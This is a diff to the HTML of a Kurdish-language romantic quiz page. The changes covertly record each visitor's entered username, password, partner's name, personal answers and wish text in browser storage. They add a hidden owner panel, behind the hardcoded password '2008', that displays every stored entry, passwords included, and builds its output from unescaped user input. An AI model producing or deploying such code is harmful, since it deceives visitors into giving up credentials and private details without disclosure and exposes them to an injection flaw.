@@ -15,7 +15,7 @@
             align-items: center;
             min-height: 100vh;
             color: #333333;
-            overflow: hidden;
+            overflow-x: hidden;
             position: relative;
         }
 
@@ -51,6 +51,7 @@
             max-width: 450px;
             text-align: center;
             border: 1px solid #f8bbd0;
+            margin: 20px;
         }
         .hidden { display: none; }
         input, select, textarea {
@@ -113,11 +114,26 @@
             font-size: 14px;
             color: #444;
         }
+        .secret-link {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .data-card {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 6px;
+            text-align: right;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
 
-    <!-- دڵەکان کە بە شێوەی خۆکارانە بەرەو سەرەوە دەچن -->
     <script>
         function createHeart() {
             const heart = document.createElement('div');
@@ -126,9 +142,7 @@
             heart.style.left = Math.random() * 100 + 'vw';
             heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
             document.body.appendChild(heart);
-            setTimeout(() => {
-                heart.remove();
-            }, 6000);
+            setTimeout(() => { heart.remove(); }, 6000);
         }
         setInterval(createHeart, 400);
     </script>
@@ -148,6 +162,7 @@
         <input type="text" id="sender" placeholder="ناوی خۆشەویستەکەت (لەلایەن کێوە بۆت هات؟)">
 
         <button onclick="goToDateSection()">بەردەوامبوون</button>
+        <div class="secret-link" onclick="openSecretAdmin()">بەشی تایبەتی خاوەن وێب</div>
     </div>
 
     <!-- ٢. پەڕەی تۆمارکردنی بەروار -->
@@ -179,22 +194,22 @@
         
         <div class="question-group">
             <label>١. ناوی ئەو کەسەی دەنگی بەلایەوە خۆشە (شاعیر یان هونەرمەند)؟</label>
-            <input type="text" placeholder="وەڵامەکەت بنووسە...">
+            <input type="text" id="q1" placeholder="وەڵامەکەت بنووسە...">
         </div>
 
         <div class="question-group">
             <label>٢. ئەو خواردنەی حەزی لێیە؟</label>
-            <input type="text" placeholder="وەڵامەکەت بنووسە...">
+            <input type="text" id="q2" placeholder="وەڵامەکەت بنووسە...">
         </div>
 
         <div class="question-group">
             <label>٣. بەچی دڵی ئەشکێت؟</label>
-            <input type="text" placeholder="وەڵامەکەت بنووسە...">
+            <input type="text" id="q3" placeholder="وەڵامەکەت بنووسە...">
         </div>
 
         <div class="question-group">
             <label>٤. بە چی ئاشت ئەبێتەوە؟</label>
-            <input type="text" placeholder="وەڵامەکەت بنووسە...">
+            <input type="text" id="q4" placeholder="وەڵامەکەت بنووسە...">
         </div>
 
         <button onclick="submitQuestions()">ناردنی وەڵامەکان</button>
@@ -208,11 +223,19 @@
         
         <div class="question-group">
             <label>داواکارییەکەت بنووسە:</label>
-            <textarea rows="4" placeholder="نامە یان داواکارییەکەت لێرە بنووسە..."></textarea>
+            <textarea id="wishText" rows="4" placeholder="نامە یان داواکارییەکەت لێرە بنووسە..."></textarea>
         </div>
 
         <button onclick="submitWish()">ناردنی داواکاری</button>
         <button onclick="showSection('main-dashboard')" class="secondary-btn">گەڕانەوە بۆ دواوە</button>
+    </div>
+
+    <!-- ٦. بەشی شاراوەی خاوەن وێب (Admin Panel) -->
+    <div class="container hidden" id="admin-section">
+        <h2>🔒 بەشی تایبەتی خاوەن وێب</h2>
+        <p style="font-size: 13px; color: #666;">ئەو زانیاری و وەڵامانەی پاشەکەوت کراون:</p>
+        <div id="saved-data-list" style="max-height: 250px; overflow-y: auto; margin: 15px 0;"></div>
+        <button onclick="showSection('login-section')" class="secondary-btn">گەڕانەوە</button>
     </div>
 
     <script>
@@ -222,11 +245,14 @@
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
             const sender = document.getElementById('sender').value;
+            const source = document.getElementById('source').value;
             
             if(!user || !pass || !sender) {
                 alert('تکایە هەموو خانەکان پڕبکەرەوە');
                 return;
             }
+
+            saveDataToStorage('چوونەژوورەوە', `سەرچاوە: ${source} | ناو: ${user} | پاسۆرد: ${pass} | خۆشەویست: ${sender}`);
 
             document.getElementById('couple-names-title').innerText = `🤍 ${user} & ${sender} 🤍`;
 
@@ -241,6 +267,8 @@
                 return;
             }
             startDate = new Date(dateInput).getTime();
+            saveDataToStorage('بەرواری یەکترناسین', `بەروار: ${dateInput}`);
+
             document.getElementById('date-section').classList.add('hidden');
             document.getElementById('main-dashboard').classList.remove('hidden');
 
@@ -248,19 +276,62 @@
         }
 
         function showSection(sectionId) {
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('date-section').classList.add('hidden');
             document.getElementById('main-dashboard').classList.add('hidden');
             document.getElementById('questions-section').classList.add('hidden');
             document.getElementById('wishes-section').classList.add('hidden');
+            document.getElementById('admin-section').classList.add('hidden');
 
             document.getElementById(sectionId).classList.remove('hidden');
         }
 
         function submitQuestions() {
+            const q1 = document.getElementById('q1').value;
+            const q2 = document.getElementById('q2').value;
+            const q3 = document.getElementById('q3').value;
+            const q4 = document.getElementById('q4').value;
+
+            saveDataToStorage('وەڵامی پرسیارەکان', `دەنگ خۆش: ${q1} | خواردن: ${q2} | دڵشکاندن: ${q3} | ئاشتکردنەوە: ${q4}`);
             alert('وەڵامەکانت پاشەکەوت کران!\n\n📸 تکایە سکرین شۆت (Screen Shot) بکە و بینێرە بۆ خۆشەویستەکەت!');
         }
 
         function submitWish() {
+            const wish = document.getElementById('wishText').value;
+            saveDataToStorage('داواکاری', `نامە/داواکاری: ${wish}`);
             alert('داواکارییەکەت نێردرا!\n\n📸 تکایە سکرین شۆت (Screen Shot) بکە و بینێرە بۆ خۆشەویستەکەت!');
+        }
+
+        function saveDataToStorage(type, content) {
+            let allData = JSON.parse(localStorage.getItem('loveWebData') || '[]');
+            allData.push({ type, content, time: new Date().toLocaleString() });
+            localStorage.setItem('loveWebData', JSON.stringify(allData));
+        }
+
+        function openSecretAdmin() {
+            const adminPass = prompt('تکایە پاسۆردی خاوەن وێب بنووسە:');
+            if (adminPass === '2008') { // دەتوانیت ئەم پاسۆردە بە ئارەزووی خۆت بگۆڕیت
+                showSection('admin-section');
+                loadAdminData();
+            } else if (adminPass !== null) {
+                alert('پاسۆردەکە هەڵەیە!');
+            }
+        }
+
+        function loadAdminData() {
+            const listDiv = document.getElementById('saved-data-list');
+            let allData = JSON.parse(localStorage.getItem('loveWebData') || '[]');
+            
+            if (allData.length === 0) {
+                listDiv.innerHTML = '<p style="color:#777;">هیچ زانیارییەک تا ئێستا تۆمار نەکراوە.</p>';
+                return;
+            }
+
+            let html = '';
+            allData.forEach(item => {
+                html += `<div class="data-card"><strong>[${item.type}]</strong> - <span style="font-size:11px; color:#880e4f;">${item.time}</span><br>${item.content}</div>`;
+            });
+            listDiv.innerHTML = html;
         }
 
         function updateCountdown() {
